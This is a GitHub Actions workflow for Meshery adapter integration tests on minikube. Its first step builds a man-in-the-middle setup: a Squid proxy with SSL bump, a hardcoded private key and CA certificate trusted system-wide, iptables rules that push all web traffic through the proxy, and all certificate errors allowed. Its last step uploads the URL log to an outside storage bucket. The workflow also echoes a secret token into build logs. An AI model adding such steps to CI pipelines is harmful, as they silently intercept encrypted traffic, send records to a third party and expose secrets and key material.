env:
  JAVA_TOOL_OPTIONS: -Djavax.net.ssl.trustStore=/usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
  NODE_OPTIONS: --use-openssl-ca
jobs:
  TestAdapter:
    outputs:
      exitstatus: ${{ steps.runresources.outputs.exitstatus }}
    runs-on: ubuntu-22.04
    steps:
    - name: before
      run: 'sudo apt update

        sudo apt install -y squid-openssl

        sudo mkdir /squid

        cat << EOF | sudo tee /squid/key.pem

        -----BEGIN PRIVATE KEY-----

        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

        CznEvO4qIs3mXDYkNBQrdVLGF93y

        -----END PRIVATE KEY-----

        EOF

        cat << EOF | sudo tee /squid/cert.pem

        -----BEGIN CERTIFICATE-----

        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

        -----END CERTIFICATE-----

        EOF

        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB

        sudo chown -R proxy:proxy /squid

        cat << EOF | sudo tee /etc/squid/squid.conf

        cache deny all


        http_port 7821

        http_port 3128 intercept

        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
        cert=/squid/cert.pem key=/squid/key.pem

        acl step1 at_step SslBump1

        ssl_bump peek step1

        ssl_bump bump all

        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB

        sslcrtd_children 5

        ssl_bump server-first all

        sslproxy_cert_error allow all


        acl all src 0.0.0.0/0

        http_access allow all


        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}

        access_log daemon:/squid/squidlog.json custom all !CONNECT

        EOF

        sudo systemctl reload squid

        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt

        sudo update-ca-certificates

        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
        -storepass changeit -noprompt -trustcacerts

        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
        80 -j DNAT --to-destination 127.0.0.1:3128

        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
        443 -j DNAT --to-destination 127.0.0.1:3129

        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
    - continue-on-error: true
      id: setk8s
      name: Setting up minikube
      uses: manusa/actions-setup-minikube@v2.7.0
      with:
        driver: docker
        kubernetes version: '"${{ matrix.k8s_version }}"'
        minikube version: v1.26.1
        start args: --cni "${{ inputs.k8s_cni }}"
    - continue-on-error: true
      name: Checkout Code
      uses: actions/checkout@master
    - continue-on-error: true
      name: Build the tagged Docker image
      run: 'eval $(minikube -p minikube docker-env)

        docker build -t test:test .

        '
    - continue-on-error: true
      name: Retrieve kubeconfig
      run: cat ~/.kube/config
    - continue-on-error: true
      env:
        provider_token: ${{ secrets.token }}
      name: Setup meshery config and infinite token for use
      run: "echo $provider_token\nmkdir ~/.meshery\nconfig='{\"contexts\":{\"local\"\
        :{\"endpoint\":\"http://localhost:9081\",\"token\":\"default\",\"platform\"\
        :\"kubernetes\",\"adapters\":[],\"channel\":\"stable\",\"version\":\"latest\"\
        }},\"current-context\":\"local\",\"tokens\":[{\"location\":\"auth.json\",\"\
        name\":\"default\"}]}'\necho $config > ~/.meshery/config.yaml\ncat ~/.meshery/config.yaml\n\
        echo \"Using provider: ${{ inputs.provider }}\"\nif  [ \"${{ inputs.provider\
        \ }}\" = \"Meshery\" ] && [ \"$provider_token\" != \"\" ] ;then\n  echo '{\
        \ \"meshery-provider\": \"Meshery\", \"token\": null }' | jq -c '.token =\
        \ \"'$provider_token'\"' > ~/.meshery/auth.json\nelse\n  echo '{ \"meshery-provider\"\
        : \"None\", \"token\": \"\" }'  > ~/.meshery/auth.json\nfi\ncat ~/.meshery/auth.json\n"
    - continue-on-error: true
      name: Start Meshery Server using mesheryctl
      run: 'curl -L https://meshery.io/install | PLATFORM=kubernetes bash -

        '
    - continue-on-error: true
      name: Start adapter
      run: 'touch testimagedep.yaml

        curl ${{ inputs.deployment_url }} > ./testimagedep.yaml

        yq e -i ''.spec.template.spec.containers[0].image="test:test"'' ./testimagedep.yaml

        yq e -i ''.spec.template.spec.containers[0].imagePullPolicy="Never"'' ./testimagedep.yaml

        cat testimagedep.yaml

        kubectl apply -f testimagedep.yaml --namespace=meshery

        kubectl apply -f ${{ inputs.service_url }} --namespace=meshery

        '
    - continue-on-error: true
      name: Start tunelling
      run: minikube tunnel &> /dev/null &
    - continue-on-error: true
      name: Check Meshery pod logs
      run: "SECONDS=0\nend=$((SECONDS+300))\nwhile [ $SECONDS -lt $end ]; do\n   \
        \ status=$(mesheryctl system  status -v | sed -n 2p | sed -e \"s/[[:space:]]\\\
        +/ /g\" |  cut -d \" \" -f 3)\n    if [ \"$status\" = \"Running\" ];then\n\
        \      break\n    fi\ndone\nmesheryctl system  logs meshery\n"
    - continue-on-error: true
      name: Check if Meshery has been allotted external IP
      run: "svcstatus=$(kubectl get svc  -n meshery| grep meshery | tr -s ' ' | cut\
        \ -d \" \" -f 4)\necho $svcstatus\nif [ \"$svcstatus\" = \"<pending>\" ];then\n\
        \   exit 1\nfi\n"
    - continue-on-error: true
      name: Reset Meshery address
      run: 'kubectl get svc -n meshery

        svcip="http://$(kubectl get svc -n meshery | grep "meshery " | tr -s '' ''
        | cut -d " " -f 3):9081"

        echo "this is $svcip"

        config=''{"contexts":{"local":{"endpoint":''$svcip'',"token":"default","platform":"kubernetes","adapters":[],"channel":"stable","version":"latest"}},"current-context":"local","tokens":[{"location":"auth.json","name":"default"}]}''

        echo $config  > ~/.meshery/config.yaml

        '
    - continue-on-error: true
      name: Download patternfile
      uses: actions/download-artifact@v3
      with:
        name: patternfile
    - continue-on-error: true
      name: Wait for Meshery pods to come up
      run: sleep 100
    - continue-on-error: true
      name: Pattern apply
      run: 'cat ./${{ inputs.patternfile_name }}

        mesheryctl pattern apply -f ./${{ inputs.patternfile_name }}

        '
    - continue-on-error: true
      name: Sleep 120 seconds
      run: sleep 120
    - continue-on-error: true
      name: Pattern apply, second iteration. [IDEMPOTENT]
      run: 'cat ./${{ inputs.patternfile_name }}

        mesheryctl pattern apply -f ./${{ inputs.patternfile_name }}

        '
    - continue-on-error: true
      name: Check adapter logs
      run: 'podname=$(kubectl get pods -n meshery | grep ${{ inputs.adapter_name }}
        | tr -s '' '' | cut -d " " -f 1)

        kubectl logs pod/$podname -n meshery

        '
    - continue-on-error: true
      name: Check Meshery logs
      run: 'mesheryctl system  logs meshery

        '
    - continue-on-error: true
      name: Whole status for debugging
      run: kubectl get all -A
    - continue-on-error: true
      id: runresources
      name: Check if all expected resources have started
      run: "SECONDS=0\nexitstatus=0\nend=$((SECONDS+300))\nresourcenames=\"${{ inputs.expected_resources\
        \ }}\"\nresourcetypes=\"${{ inputs.expected_resources_types }}\"\nnsnames=\"\
        ${{ inputs.expected_resources_namespaces}}\"\nset -f\nresources=(${resourcenames//,/\
        \ })\ntypes=(${resourcetypes//,/ })\nns=(${nsnames//,/ })\n\nbreakout=1\n\n\
        while [ $SECONDS -lt $end ]; do\n    for i in \"${!resources[@]}\"\n    do\n\
        \        resourceinfo=$(kubectl get ${types[i]} -n ${ns[i]} | grep ${resources[i]}\
        \ | tr -s ' ')\n        resourcestarted=$(echo $resourceinfo | cut -d \" \"\
        \ -f 1)\n        resourcestatus=$(echo $resourceinfo | cut -d \" \" -f 3)\n\
        \        if [[ (\"${types[i]}\" = \"pod\" && \"$resourcestatus\" != \"Running\"\
        ) || (\"${types[i]}\" != \"pod\" && \"$resourcestarted\" = \"\") ]];then\n\
        \          breakout=0\n        fi\n    done\n    if [ $breakout -eq 1 ];then\n\
        \      break\n    fi\n    breakout=1\ndone\ntouch data.json\nrunon=$(date)\n\
        itran=0\nitdidnotrun=0\necho \"Ran on $runon\"\necho '{\"metadata\":{ \"k8s_version\"\
        :\"'${{ matrix.k8s_version }}'\", \"service_mesh_name\":\"'${{ inputs.adapter_name\
        \ }}'\", \"service_mesh_version\":\"'${{ inputs.sm_version }}'\",\"adapter_version\"\
        :\"'${{ inputs.adapter_version }}'\" ,\"runon\":\"'$runon'\"}, \"resources_status\"\
        :{}, \"overall-status\":\"\"}' | jq > ./data.json\nfor i in \"${!resources[@]}\"\
        \ndo\n  resourceinfo=$(kubectl get ${types[i]} -n ${ns[i]} | grep ${resources[i]}\
        \ | tr -s ' ')\n  resourcestarted=$(echo $resourceinfo | cut -d \" \" -f 1)\n\
        \  resourcestatus=$(echo $resourceinfo | cut -d \" \" -f 3)\n  if [[ (\"${types[i]}\"\
        \ = \"pod\" && \"$resourcestatus\" = \"Running\") || (\"${types[i]}\" != \"\
        pod\" && \"$resourcestarted\" != \"\") ]];then\n    itran=1\n    echo \"${types[i]}\
        \ ${resources[i]} started in namespace ${ns[i]}\"\n    echo $(jq '.resources_status.\"\
        '${types[i]}/${resources[i]}'\" |=  \"Running\"' data.json) > data.json\n\
        \  else\n    itdidnotrun=1\n    echo \"${types[i]} ${resources[i]} did not\
        \ start in namespace ${ns[i]} \"\n    echo $(jq '.resources_status.\"'${types[i]}/${resources[i]}'\"\
        \ |=  \"Not Running\"' data.json) > data.json\n    exitstatus=1\n  fi\ndone\n\
        status=\"\"\nif [ \"$exitstatus\" -eq 0 ];then\n    status=\"passing\"\nelse\n\
        \    status=\"failing\"\nfi\nif [ \"$itran\" -eq 1 ] && [ \"$itdidnotrun\"\
        \ -eq 1  ] ;then\n    status=\"partial\"\nfi\necho $(jq '.\"overall-status\"\
        \ |=  \"'$status'\"' data.json) > data.json;\nMESHERY_VERSION=$(curl -L -s\
        \ https://github.com/meshery/meshery/releases/latest | grep \"/releases/tag/\"\
        \ | head -1 | awk -F '\"' '{print $4}' | awk -F '/' '{print $NF}' )\necho\
        \ $(jq '.metadata.\"meshery-server-version\" |=\"'$MESHERY_VERSION'\"' data.json\
        \ ) > data.json\necho \"exitstatus=$exitstatus\" >> $GITHUB_ENV\n"
    - continue-on-error: true
      name: UploadResults
      uses: actions/upload-artifact@v3
      with:
        name: ${{ inputs.output_filename }}
        path: ./${{ inputs.output_filename }}
    - continue-on-error: true
      name: exit
      run: "if [ \"$exitstatus\" -eq 1 ];then\n    exit 1\nfi\n"
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid2/sarthaksarthak9/meshery.$(date
        +%s)
    strategy:
      fail-fast: false
      matrix:
        k8s_version:
        - v1.23.13
        - v1.24.7
        - v1.25.3
    timeout-minutes: 60
name: Adapter Integration - Core
'on':
  workflow_dispatch: {}
